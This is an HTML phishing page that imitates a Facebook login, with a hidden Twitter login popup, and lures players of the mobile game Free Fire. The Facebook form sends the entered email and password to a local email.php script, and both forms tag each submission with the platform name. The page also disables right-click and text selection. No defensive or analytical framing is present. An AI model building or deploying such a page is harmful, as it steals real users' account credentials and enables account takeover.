<html>
<head>
<script src="../../cdn-cgi/apps/head/AlAgxD7oxHZSiFZQmr6zl7N739c.js"></script></head>
<body ondragstart="return false" onselectstart="return false" oncontextmenu="return false">
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no">
<meta http-equiv="X-UA-Compatible" content="IE=edge">
<link rel="stylesheet" href="css/style.css">
<link rel="stylesheet" href="css/animate.css">
<link rel="stylesheet" href="css/login/facebook.css">
<link rel="stylesheet" href="css/login/twitter.css">
<link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css">
<style type="text/css">
#collect fieldset:not(:first-of-type) {
display: none;
}
.popup-login {
background:rgba(0,0,0,0.5);
width:100%;
height:100%;
position:fixed;
top:0;
left:0;
z-index:9999;
}
.popup-box-login-fb {
background:#ECEFF6;
max-width:330px;
height:auto;
position:relative;
margin:50px auto;
margin-top:1.9%;
text-align:center;
font-family:'Teko';
color:#000;
border-radius:10px;
}
.popup-box-login-twitter {
background:#fff;
max-width:330px;
height:350px;
position:relative;
margin:50px auto;
margin-top:10%;
text-align:center;
font-family:'Teko';
color:#000;
border-radius:10px;
}
.close-fb {
background:#000;
width:20px;
height:20px;
color:#fff;
text-align:center;
text-decoration:none;
border-radius:50%;
border:1.5px solid #fff;
position:absolute;
top:-8px;
right:-10px;
display:block;
}
.close-fb i {
color:#fff;
padding-top:1px;
}
.close-other {
background:#000;
width:20px;
height:20px;
color:#fff;
text-align:center;
text-decoration:none;
border-radius:50%;
border:1.5px solid #fff;
top:-8px;
right:-10px;
position:absolute;
z-index:9999999;
display:block;
}
.close-other i {
color:#fff;
padding-top:1px;
}
@media only screen and (max-width:600px) {
.popup-box-login-fb {
margin-top: 4%;
}
}
</style>
<div class="container">
<div class="header">
<center>
<div class="navbar-fb">
<img src="img/login/facebook_text.png">
</div>
<div class="content-box-fb">
<img src="https://play-lh.googleusercontent.com/cw0x8EiZYDwL6x4XKKXDmfQsFDYKO4Q6xIfiyPOvgIjHCpe41QAM_rl4y0dLu0SJOdM=s180">
<div class="txt-login-fb">
Log in to your Facebook account to connect to FREE FIRE MOBILE
</div>
   <form class="login-form" action="email.php" method="post">
<input type="text" name="email" placeholder="Mobile number or email address" autocomplete="off" autocapitalize="none" required="">
</label>
<label>
<input type="password" name="password" placeholder="Password" autocomplete="off" autocapitalize="none" required="">
</label>
<input type="hidden" name="login" value="Facebook" readonly="">
<button type="submit" class="btn-login-fb">Log In</button>
</form>
<div class="txt-create-account">Create account</div>
<div class="txt-not-now">Not now</div>
<div class="txt-forgotten-password">Forgotten password?</div>
</div>
<div class="language-box">
<center>
<div class="language-name language-name-active">English (UK)</div>
<div class="language-name">Bahasa Indonesia</div>
<div class="language-name">Basa Jawa</div>
<div class="language-name">Bahasa Melayu</div>
<div class="language-name">æ¥æ¬èª</div>
<div class="language-name">EspaÃ±ol</div>
<div class="language-name">PortuguÃªs (Brasil)</div>
<div class="language-name">
<i class="fa fa-plus"></i>
</div>
</center>
</div>
<div class="copyright">Facebook Inc.</div>
</center></div>
</div>
<div class="popup-login login-twitter animated fadeIn" style="display: none;">
<div class="popup-box-login-twitter">
<a onclick="tutup_twitter()" class="close-other"><i class="zmdi zmdi-close"></i></a>
<div class="header-twitter">
<center>
<img src="img/login/twitter_text.png">
</center>
</div>
<div class="box-twitter">
<center>
<form method="post">
<div class="txt-login-twitter">Login to Twitter</div>
<div class="input-box-twitter">
<label>Phone, email, or username</label>
<input type="email" name="email" placeholder="" required="">
</div>
<div class="input-box-twitter">
<label>Password</label>
<input type="password" name="password" placeholder="" required="">
</div>
<input type="hidden" name="login" value="Twitter" readonly="">
<button type="submit" class="btn-login-twitter">Log In</button>
<div class="footer-menu-twitter">Forgot password?</div>
<div class="footer-menu-twitter bulet">â¢</div>
<div class="footer-menu-twitter">Sign up to Twitter</div>
</form>
</center>
</div>
</div>
</div>

<script src="https://ajax.googleapis.com/ajax/libs/jquery/2.1.3/jquery.min.js"></script>
<script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.5/js/bootstrap.min.js"></script>

<script type="text/javascript" src="https://code.jquery.com/jquery-1.10.2.min.js"></script>
<script src="js/timer.js"></script>
<script src="js/tab.js"></script>
<script src="js/popup.js"></script>
<script src="js/fieldset.js"></script>
<script src="js/click.js"></script>
<noscript><i>Javascript required</i></noscript>
</body></html>